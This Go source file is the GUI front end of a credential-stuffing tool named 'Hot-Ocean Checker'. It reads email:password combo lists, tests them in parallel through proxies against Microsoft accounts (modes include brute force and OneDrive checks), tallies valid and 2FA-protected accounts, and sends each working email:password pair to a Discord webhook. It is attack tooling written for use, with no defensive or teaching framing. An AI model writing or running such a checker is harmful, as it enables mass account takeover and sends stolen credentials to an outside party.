package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
)

type Config struct {
	Mode         int
	Threads      int
	Proxy        string
	ComboFileURI fyne.URI
	Keywords     []string
	DiscordWebhook string
}

func sendDiscordWebhook(url, msg string) {
	if url == "" {
		return
	}
	payload := map[string]string{"content": msg}
	b, _ := json.Marshal(payload)
	http.Post(url, "application/json", bytes.NewBuffer(b))
}

func main() {
	a := app.NewWithID("com.ocean.checker")
	w := a.NewWindow("Hot-Ocean Checker")

	// UI Elements
	modeSelect := widget.NewSelect([]string{"MS Subscription", "Inboxer Only", "Brute", "Country Target", "OneDrive Check", "All-In-One"}, nil)
	modeSelect.SetSelectedIndex(0)

	threadEntry := widget.NewEntry()
	threadEntry.SetText("50")

	proxyEntry := widget.NewEntry()
	proxyEntry.SetPlaceHolder("http://user:pass@ip:port")

	webhookEntry := widget.NewEntry()
	webhookEntry.SetPlaceHolder("Discord Webhook URL")

	comboLabel := widget.NewLabel("No combo file selected")
	var comboURI fyne.URI

	logArea := widget.NewMultiLineEntry()
	logArea.Disable()
	logArea.Wrapping = fyne.TextWrapWord

	statsLabel := widget.NewLabel("Checked: 0 | Hits: 0 | 2FA: 0 | Bad: 0")

	logMsg := func(msg string) {
		text := logArea.Text
		if len(text) > 5000 {
			text = text[len(text)-5000:] // keep last 5000 chars roughly
		}
		logArea.SetText(text + "\n" + msg)
		logArea.CursorColumn = 0
		logArea.CursorRow = len(strings.Split(logArea.Text, "\n")) - 1
	}

	selectBtn := widget.NewButton("Select Combo File", func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, w)
				return
			}
			if reader == nil {
				return
			}
			comboURI = reader.URI()
			comboLabel.SetText(comboURI.Name())
		}, w)
		fd.Show()
	})

	var isRunning bool
	var stopChan chan struct{}

	startBtn := widget.NewButton("Start", nil)

	startBtn.OnTapped = func() {
		if isRunning {
			close(stopChan)
			startBtn.SetText("Start")
			isRunning = false
			logMsg("[SYSTEM] Stopped by user.")
			return
		}

		if comboURI == nil {
			dialog.ShowInformation("Error", "Please select a combo file.", w)
			return
		}

		threads, err := strconv.Atoi(threadEntry.Text)
		if err != nil || threads < 1 {
			threads = 50
		}

		isRunning = true
		startBtn.SetText("Stop")
		stopChan = make(chan struct{})

		logMsg(fmt.Sprintf("[SYSTEM] Starting with %d threads...", threads))

		go func() {
			// Read combos
			reader, err := storage.Reader(comboURI)
			if err != nil {
				logMsg("[ERROR] Could not read combo file.")
				return
			}
			defer reader.Close()

			b, _ := io.ReadAll(reader)
			lines := strings.Split(string(b), "\n")
			var combos []string
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.Contains(line, ":") {
					combos = append(combos, line)
				}
			}

			if len(combos) == 0 {
				logMsg("[ERROR] No valid combos found.")
				return
			}

			logMsg(fmt.Sprintf("[SYSTEM] Loaded %d combos.", len(combos)))

			mode := modeSelect.SelectedIndex() + 1

			jobs := make(chan string, len(combos))
			for _, c := range combos {
				jobs <- c
			}
			close(jobs)

			var wg sync.WaitGroup
			var checked, hits, twofa, bads int
			var mu sync.Mutex

			updateStats := func() {
				mu.Lock()
				defer mu.Unlock()
				statsLabel.SetText(fmt.Sprintf("Checked: %d/%d | Hits: %d | 2FA: %d | Bad: %d", checked, len(combos), hits, twofa, bads))
			}

			for i := 0; i < threads; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					chk := NewChecker(nil, false, mode)
					chk.Proxy = proxyEntry.Text
					
					for line := range jobs {
						select {
						case <-stopChan:
							return
						default:
						}

						parts := strings.SplitN(line, ":", 2)
						if len(parts) < 2 {
							continue
						}
						
						email := strings.TrimSpace(parts[0])
						pass := strings.TrimSpace(parts[1])

						r := chk.Check(email, pass)

						mu.Lock()
						checked++
						if r.Status == "HIT" {
							hits++
							msg := fmt.Sprintf("✅ HIT: %s:%s | %s", email, pass, r.Country)
							logMsg(msg)
							sendDiscordWebhook(webhookEntry.Text, msg)
						} else if r.Status == "2FA" {
							twofa++
							logMsg(fmt.Sprintf("🔐 2FA: %s", email))
						} else {
							bads++
						}
						mu.Unlock()

						if checked%10 == 0 {
							updateStats()
						}
					}
				}()
			}

			wg.Wait()
			updateStats()
			logMsg("[SYSTEM] Completed.")
			isRunning = false
			startBtn.SetText("Start")
		}()
	}

	tabs := container.NewAppTabs(
		container.NewTabItem("Scanner", container.NewBorder(
			container.NewVBox(
				container.NewHBox(selectBtn, comboLabel),
				statsLabel,
				startBtn,
			),
			nil, nil, nil,
			logArea,
		)),
		container.NewTabItem("Settings", container.NewVBox(
			widget.NewLabel("Mode:"), modeSelect,
			widget.NewLabel("Threads (CPM):"), threadEntry,
			widget.NewLabel("Proxy (http://ip:port):"), proxyEntry,
			widget.NewLabel("Discord Webhook:"), webhookEntry,
		)),
	)

	w.SetContent(tabs)
	w.Resize(fyne.NewSize(400, 600))
	w.ShowAndRun()
}
